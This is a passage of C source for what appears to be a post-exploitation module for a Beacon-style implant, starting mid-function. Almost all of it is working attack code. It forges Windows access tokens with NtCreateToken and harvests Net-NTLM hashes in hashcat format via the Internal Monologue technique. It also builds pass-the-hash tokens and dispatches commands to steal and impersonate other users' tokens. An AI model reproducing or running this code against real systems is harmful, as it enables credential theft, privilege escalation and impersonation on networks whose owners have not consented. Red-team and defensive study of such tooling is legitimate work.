			domn = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnSz + 1 ) * 2 );

			//
			// call and free memory
			//
			success = ADVAPI32$LookupAccountNameW( NULL, username, groups->Groups[ NUMBER_OF_DEFAULT_GROUPS + i ].Sid,
			                                       &userSz, domn, &domnSz, &sidType );
			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, domn );
			if ( ! success ) {
				PRINT_WIN32_ERROR( "LookupAccountNameW" );
				goto END;
			}
		}
	}

	//
	// add the privileges
	//
	privs                 = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, SIZE_OF_PRIVILEGES( privLen ) );
	privs->PrivilegeCount = privLen;

	for ( int i = 0 ; i < privLen ; i++ ) {
		privs->Privileges[ i ].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT;
		privs->Privileges[ i ].Luid       = ConvertPrivilegeToLuid( privNames[ i ] );
	}

	//
	// create the object attributes
	//
	InitializeObjectAttributes( &objAttrs, NULL, 0, NULL, 0 );
	sqos.Length                       = sizeof( SECURITY_QUALITY_OF_SERVICE );
	sqos.ImpersonationLevel           = SecurityImpersonation;
	sqos.ContextTrackingMode          = 0;
	sqos.EffectiveOnly                = FALSE;
	objAttrs.SecurityQualityOfService = &sqos;

	//
	// create the token
	//
	if ( ! NT_SUCCESS( status = NTDLL$NtCreateToken(
		&token,
		TOKEN_ALL_ACCESS,
		&objAttrs,
		TokenPrimary,
		&authLuid,
		&expire,
		&user,
		groups,
		privs,
		NULL,
		&primaryGrp,
		NULL,
		&source
	) ) ) {
		//
		// print friendly message for common errors
		//
		switch ( status ) {
			case 0xC0000061 :
				PRINTF_ERROR( "You need to have the SeCreateTokenPrivilege to perform that command!" );
				break;
			default :
				PRINT_NT_ERROR( "NtCreateToken", status );
		}

		goto END;
	}

	//
	// add the token to the vault
	//
	TokenAdd( token, 0, NULL, NULL, NULL );

END:
	if ( user.User.Sid ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, user.User.Sid );

	for ( int i = 0 ; i < 6 + groupLen ; i++ ) {
		if ( groups->Groups[ i ].Sid && i != 5 ) {
			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, groups->Groups[ i ].Sid );
		}
	}
}

/*!
 * @brief
 *	the a Net-NTLM hash for the current user
 *	you just have to impersonate that a token of that user before
 *	impersonating token in the current thread can be done using the TokenImpersonate function
 *	LSA has to have the user creds cached in memory, otherwise it wont work
 *	the idea is not mine, it's the one of Elad Shamir, all credits go to him
 *	you can find its project for that here: https://github.com/eladshamir/Internal-Monologue
 *
 * @param token
 *	token to use to perform the ntlm auth
 *
 * @param netNtlmv1
 *	change a few registry keys to allow Net-NTLMv1 authentication and get a hash that is a lot easier to crack
 *
 * @return
 */

VOID TokenInternalMonologue(
	IN HANDLE token,
	IN BOOL   netNtlmv1
) {
	NTSTATUS            status            = { 0 };
	SecBuffer           negotiateToken    = { 0 };
	SecBuffer           challengeToken    = { 0 };
	SecBuffer           authenticateToken = { 0 };
	PAUTHENTICATE_TOKEN pAuthToken        = { 0 };
	PCHALLENGE_TOKEN    pChallToken       = { 0 };
	CtxtHandle          clientCtx         = { 0 };
	CtxtHandle          clientCreds       = { 0 };
	CtxtHandle          serverCtx         = { 0 };
	CtxtHandle          serverCreds       = { 0 };
	PTOKEN_USER         userInfo          = { 0 };
	ULONG               userSz            = { 0 };
	ULONG               sz                = { 0 };
	SID_NAME_USE        sidType           = { 0 };
	UNICODE_STRING      username          = { 0 };
	UNICODE_STRING      domain            = { 0 };
	UNICODE_STRING      hash              = { 0 };
	ULONG               usernameSz        = { 0 };
	ULONG               domainSz          = { 0 };

	//
	// get the username of the token
	//
	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, 0, &userSz ) ) ) {
		userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSz );

		//
		// get the sid
		//
		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, userSz,
			&userSz
		) ) ) {
			PRINT_NT_ERROR( "NtQueryInformationToken", status );
			goto END;
		}

		//
		// convert the sid
		//
		if ( ! ADVAPI32$LookupAccountSidW( NULL, userInfo->User.Sid, NULL, &usernameSz, NULL, &domainSz, &sidType ) ) {
			//
			// allocate memory & recall
			//
			username.MaximumLength = ( usernameSz ) * sizeof( WCHAR );
			domain.MaximumLength   = ( domainSz ) * sizeof( WCHAR );
			username.Buffer        = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, username.MaximumLength );
			domain.Buffer          = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, domain.MaximumLength );

			if ( ! ADVAPI32$LookupAccountSidW( NULL, userInfo->User.Sid, username.Buffer,
			                                   &usernameSz, domain.Buffer, &domainSz, &sidType
			) ) {
				PRINT_WIN32_ERROR( "LookupAccountSidA" );
				return;
			}

			username.Length = username.MaximumLength - sizeof( WCHAR );
			domain.Length   = domain.MaximumLength - sizeof( WCHAR );
		}
	}

	/*
	 * get a negotiate token
	 * if no arbitrary creds are supplied it will do local authentication instead
	 * when doing local authentication the server sets the reserved member
	 * and when the reserved member is set, LSA on the client side set an empty LM & NT response
	 * if the LM & NT response are empty there won't be any hash to crack, could maybe crack the mic but i prefer
	 * cracking the challenge response anyway
	 * used dummy credentials to avoid local authentication
	 * theorically could also patch the reserved member of the challenge token but can't make it work
	 */
	if ( ! NT_SUCCESS( status = ClientCreateNegotiateToken(
		&username,
		&domain,
		&negotiateToken,
		&clientCtx,
		&clientCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the negotiate token\n" );
		goto END;
	}

	//
	// get a challenge token
	//
	if ( ! NT_SUCCESS( status = ServerCreateChallengeToken(
		&negotiateToken,
		&challengeToken,
		&serverCtx,
		&serverCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the challenge token\n" );
		goto END;
	}

	//
	// get an authenticate token
	//
	if ( ! NT_SUCCESS( status = ClientCreateAuthenticateToken(
		NULL,
		NULL,
		NULL,
		NULL,
		&challengeToken,
		&clientCtx,
		&clientCreds,
		&authenticateToken
	) ) ) {
		PRINTF( "[!] Failed to generate the authenticate token\n" );
		goto END;
	}

	if ( authenticateToken.cbBuffer < 300 ) {
		PRINTF_ERROR( "Local authentication was performed, can't extract Net-NTLM hash" );
		goto END;
	}

	//
	// set to hashcat format
	// user::domain:serverchallenge:ntProofStr:ntlmv2ClientChallenge
	//
	pAuthToken  = authenticateToken.pvBuffer;
	pChallToken = challengeToken.pvBuffer;
	hash.Length = ( 54 + pAuthToken->NtChallengeResponseFields.NtChallengeResponseLen * 2 ) * sizeof( WCHAR ) +
	              pAuthToken->UserNameFields.UserNameLen + pAuthToken->DomainNameFields.DomainNameLen;
	hash.Buffer = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, hash.Length );

	MemCopy( hash.Buffer, C_PTR( pAuthToken ) + pAuthToken->UserNameFields.UserNameBufferOffset,
	         pAuthToken->UserNameFields.UserNameLen );
	sz += pAuthToken->UserNameFields.UserNameLen;

	hash.Buffer[ sz / 2 ]     = L':';
	hash.Buffer[ sz / 2 + 1 ] = L':';
	sz += 4;

	MemCopy( C_PTR( hash.Buffer ) + sz, C_PTR( pAuthToken ) + pAuthToken->DomainNameFields.DomainNameBufferOffset,
	         pAuthToken->DomainNameFields.DomainNameLen );
	sz += pAuthToken->DomainNameFields.DomainNameLen;

	hash.Buffer[ sz / 2 ] = L':';
	sz += 2;

	ConvertBytesToHexStringW( pChallToken->ServerChallenge, 8, C_PTR( hash.Buffer ) + sz );
	sz += 32;

	hash.Buffer[ sz / 2 ] = L':';
	sz += 2;

	ConvertBytesToHexStringW(
		( ( PNT_CHALLENGE_RESPONSE ) (
			C_PTR( pAuthToken ) + pAuthToken->NtChallengeResponseFields.NtChallengeResponseBufferOffset ) )->NtProofStr,
		16, C_PTR( hash.Buffer ) + sz );
	sz += 64;

	hash.Buffer[ sz / 2 ] = L':';
	sz += 2;

	ConvertBytesToHexStringW(
		&( ( PNT_CHALLENGE_RESPONSE ) (
			C_PTR( pAuthToken ) + pAuthToken->NtChallengeResponseFields.NtChallengeResponseBufferOffset ) )->Challenge,
		pAuthToken->NtChallengeResponseFields.NtChallengeResponseLen - 16, C_PTR( hash.Buffer ) + sz
	);

	PRINTF( "%ls", hash.Buffer );

END:
	if ( negotiateToken.pvBuffer )SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
	if ( challengeToken.pvBuffer )SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
	if ( authenticateToken.pvBuffer )SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, userInfo );
	if ( username.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, username.Buffer );
	if ( domain.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, domain.Buffer );
	if ( hash.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, hash.Buffer );
}

/*!
 * @brief
 *	create a token for a user using his creds
 *
 * @param username
 *	username
 *
 * @param domain
 *	domain
 *
 * @param password
 *	password
 *
 * @param logonType
 *	logon type must be something like LOGON32_LOGON_*
 */
VOID TokenMake(
	PWSTR username,
	PWSTR domain,
	PWSTR password,
	ULONG logonType
) {
	HANDLE token = { 0 };

	//
	// create the token
	//
	if ( ! ADVAPI32$LogonUserW(
		username,
		domain,
		password,
		logonType,
		LOGON32_PROVIDER_DEFAULT,
		&token
	) ) {
		PRINT_WIN32_ERROR( "LogonUserW" );
		return;
	}

	//
	// add the token to the vault
	//
	TokenAdd( token, 0, username, domain, password );
}

/*!
 * @brief
 *	create a network logon type token using pass the hash
 *
 * @param username
 *	username
 *
 * @param domain
 *	domain
 *
 * @param ntHash
 *	NT hash
 */
VOID TokenMakePth(
	IN PUNICODE_STRING username,
	IN PUNICODE_STRING domain,
	IN PBYTE           ntHash
) {
	NTSTATUS   status            = { 0 };
	SecBuffer  negotiateToken    = { 0 };
	CtxtHandle clientCtx         = { 0 };
	CredHandle clientCreds       = { 0 };
	SecBuffer  challengeToken    = { 0 };
	CtxtHandle serverCtx         = { 0 };
	CredHandle serverCreds       = { 0 };
	SecBuffer  authenticateToken = { 0 };
	HANDLE     accessToken       = { 0 };

	// get a negotiate token
	if ( ! NT_SUCCESS( status = ClientCreateNegotiateToken(
		username,
		domain,
		&negotiateToken,
		&clientCtx,
		&clientCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the negotiate token\n" );
		goto END;
	}

	// get a challenge token
	if ( ! NT_SUCCESS( status = ServerCreateChallengeToken(
		&negotiateToken,
		&challengeToken,
		&serverCtx,
		&serverCreds
	) ) ) {
		PRINTF( "[!] Failed to generate the challenge token\n" );
		goto END;
	}

	// get an authenticate token
	if ( ! NT_SUCCESS( status = ClientCreateAuthenticateToken(
		username,
		domain,
		ntHash,
		&negotiateToken,
		&challengeToken,
		&clientCtx,
		&clientCreds,
		&authenticateToken
	) ) ) {
		PRINTF( "[!] Failed to generate the authenticate token\n" );
		goto END;
	}

	// get an access token
	if ( ! NT_SUCCESS( status = ServerAcceptAuthenticateToken(
		&authenticateToken,
		&serverCtx,
		&serverCreds,
		&accessToken
	) ) ) {
		PRINTF( "[!] Failed to generate an access token\n" );
		goto END;
	}

	// add to the vault
	TokenAdd( accessToken, 0, username->Buffer, domain->Buffer,NULL );

END:
	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
	if ( challengeToken.pvBuffer ) SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
	if ( authenticateToken.pvBuffer ) SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
}

VOID go(
	IN PCHAR args,
	IN ULONG argc
) {
	datap          parser       = { 0 };
	BYTE           ntHash[ 32 ] = { 0 };
	PSTR           command      = { 0 };
	STRING         usernameA    = { 0 };
	STRING         domainA      = { 0 };
	STRING         passwordA    = { 0 };
	STRING         logon        = { 0 };
	STRING         privNamesA   = { 0 };
	STRING         groupNamesA  = { 0 };
	ULONG          logonType    = { 0 };
	UNICODE_STRING usernameW    = { 0 };
	UNICODE_STRING domainW      = { 0 };
	UNICODE_STRING passwordW    = { 0 };
	UNICODE_STRING privNamesW   = { 0 };
	UNICODE_STRING groupNamesW  = { 0 };
	INT            commandLen   = { 0 };
	INT            pid          = { 0 };
	INT            id           = { 0 };
	PWSTR *        groups       = { 0 };
	PWSTR *        privs        = { 0 };
	USHORT         groupsSz     = { 0 };
	USHORT         privsSz      = { 0 };
	PTOKEN_ENTRY   entry        = { 0 };
	HANDLE         token        = NtCurrentThreadEffectiveToken();

	BeaconDataParse( &parser, args, argc );

	command = BeaconDataExtract( &parser, &commandLen );

	if ( StringCompareA( command, "list" ) ) {
		//
		// list all the available tokens in the vault
		//
		TokenList();
	} else if ( StringCompareA( command, "steal" ) ) {
		//
		// steal a token from a process
		//
		pid = BeaconDataInt( &parser );
		TokenSteal( pid );
	} else if ( StringCompareA( command, "impersonate" ) ) {
		//
		// impersonate a token from the vault
		//
		id = BeaconDataInt( &parser );
		TokenImpersonate( id );
	} else if ( StringCompareA( command, "revert" ) ) {
		//
		// revert to the original token
		//
		TokenRevert();
	} else if ( StringCompareA( command, "getuid" ) ) {
		//
		// get the user of the current token
		//
		TokenGetuid();
	} else if ( StringCompareA( command, "remove" ) ) {
		//
		// remove a token from the vault
		//
		id = BeaconDataInt( &parser );
		TokenRemove( id );
	} else if ( StringCompareA( command, "make_pth" ) ) {
		//
		// get the arguments
		//
		usernameA.Buffer = BeaconDataExtract( &parser, &usernameA.Length );
		domainA.Buffer   = BeaconDataExtract( &parser, &domainA.Length );
		passwordA.Buffer = BeaconDataExtract( &parser, &passwordA.Length );

		if ( ! usernameA.Buffer || ! domainA.Buffer || ! passwordA.Buffer ) return;

		//
		// convert the arguments to the right format
		//
		CharStringToUnicodeString( usernameA.Buffer, usernameA.Length, &usernameW );
		CharStringToUnicodeString( domainA.Buffer, domainA.Length, &domainW );

		if ( ConvertNtHashStringToBytes( passwordA.Buffer, ntHash ) ) {
			//
			// pass the hash
			//
			TokenMakePth( &usernameW, &domainW, ntHash );
		}
	} else if ( StringCompareA( command, "make" ) ) {
		//
		// get the arguments
		//
		usernameA.Buffer = BeaconDataExtract( &parser, &usernameA.Length );
		domainA.Buffer   = BeaconDataExtract( &parser, &domainA.Length );
		passwordA.Buffer = BeaconDataExtract( &parser, &passwordA.Length );
		logon.Buffer     = BeaconDataExtract( &parser, &logon.Length );

		if ( ! usernameA.Buffer || ! domainA.Buffer || ! passwordA.Buffer ) return;

		//
		// convert the arguments to the right format
		//
		CharStringToUnicodeString( usernameA.Buffer, usernameA.Length, &usernameW );
		CharStringToUnicodeString( domainA.Buffer, domainA.Length, &domainW );
		CharStringToUnicodeString( passwordA.Buffer, passwordA.Length, &passwordW );

		//
		// get the logon type
		//
		if ( ! logon.Buffer ) {
			logonType = LOGON32_LOGON_INTERACTIVE;
		} else if ( StringCompareA( logon.Buffer, "BATCH" ) ) {
			logonType = LOGON32_LOGON_BATCH;
		} else if ( StringCompareA( logon.Buffer, "INTERACTIVE" ) ) {
			logonType = LOGON32_LOGON_INTERACTIVE;
		} else if ( StringCompareA( logon.Buffer, "NETWORK" ) ) {
			logonType = LOGON32_LOGON_NETWORK;
		} else if ( StringCompareA( logon.Buffer, "NETWORK_CLEARTEXT" ) ) {
			logonType = LOGON32_LOGON_NETWORK_CLEARTEXT;
		} else if ( StringCompareA( logon.Buffer, "NEW_CREDENTIALS" ) ) {
			logonType = LOGON32_LOGON_NEW_CREDENTIALS;
		} else if ( StringCompareA( logon.Buffer, "SERVICE" ) ) {
			logonType = LOGON32_LOGON_SERVICE;
		} else if ( StringCompareA( logon.Buffer, "UNLOCK" ) ) {
			logonType = LOGON32_LOGON_UNLOCK;
		} else {
			PRINTF_ERROR( "Invalid logon type!" );
			return;
		}

		//
		// create the token
		//
		TokenMake( usernameW.Buffer, domainW.Buffer, passwordW.Buffer, logonType );
	} else if ( StringCompareA( command, "info" ) ) {
		//
		// get the arguments
		//
		id = BeaconDataInt( &parser );

		if ( id != 0 ) {
			entry = TokenGet( id );

			if ( entry ) {
				// todo: give the possibility to chose between the impersonation token and primary
				token = entry->ImpersonationToken;
			}
		}

		//
		// query the token for info
		//
		TokenInfo( token );
	} else if ( StringCompareA( command, "create" ) ) {
		//
		// get the arguments
		//
		usernameA.Buffer   = BeaconDataExtract( &parser, &usernameA.Length );
		groupNamesA.Buffer = BeaconDataExtract( &parser, &groupNamesA.Length );
		privNamesA.Buffer  = BeaconDataExtract( &parser, &privNamesA.Length );

		if ( ! usernameA.Buffer || ! groupNamesA.Buffer || ! privNamesA.Buffer ) return;

		//
		// convert to wide string
		//
		CharStringToUnicodeString( usernameA.Buffer, usernameA.Length, &usernameW );
		CharStringToUnicodeString( groupNamesA.Buffer, groupNamesA.Length, &groupNamesW );
		CharStringToUnicodeString( privNamesA.Buffer, privNamesA.Length, &privNamesW );

		//
		// parse the privs and groups
		//
		groups = StringSplitW( groupNamesW.Buffer, 44, &groupsSz );
		privs  = StringSplitW( privNamesW.Buffer, 44, &privsSz );

		//
		// create the token
		//
		TokenCreate( usernameW.Buffer, groups, groupsSz, privs, privsSz );

		//
		// free the strings
		//
		StringSplitFreeW( groups, groupsSz );
		StringSplitFreeW( privs, privsSz );
	} else if ( StringCompareA( command, "internal-monologue" ) ) {
		TokenInternalMonologue( NtCurrentThreadEffectiveToken(), FALSE );
	}

	if ( usernameW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, usernameW.Buffer );
	if ( domainW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, domainW.Buffer );
	if ( passwordW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, passwordW.Buffer );
	if ( groupNamesW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, groupNamesW.Buffer );
	if ( privNamesW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, privNamesW.Buffer );
};
